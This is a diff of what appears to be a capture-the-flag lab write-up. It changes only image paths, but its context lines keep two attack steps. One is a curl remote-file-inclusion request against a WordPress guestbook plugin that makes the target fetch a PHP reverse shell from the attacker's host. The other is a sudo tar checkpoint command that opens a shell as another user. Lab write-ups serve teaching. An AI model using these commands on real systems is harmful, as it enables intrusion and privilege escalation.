@@ -18,7 +18,7 @@ PORT   STATE SERVICE
 
 The web page only shows this:
 
-<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (539).png" alt=""><figcaption></figcaption></figure>
 
 I checked for `robots.txt`, which is quite common for old machines.&#x20;
 
@@ -135,7 +135,7 @@ We can grab a PHP reverse shell from PentestMonkey and rename it to `wp-load.php
 $ curl http://10.129.85.109/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.13/
 ```
 
-<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (531).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
@@ -184,7 +184,7 @@ From GTFOBins, we can use this command to get a shell as the user:
 sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 ```
 
-<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (536).png" alt=""><figcaption></figcaption></figure>
 
 We can now grab the user flag.&#x20;
 
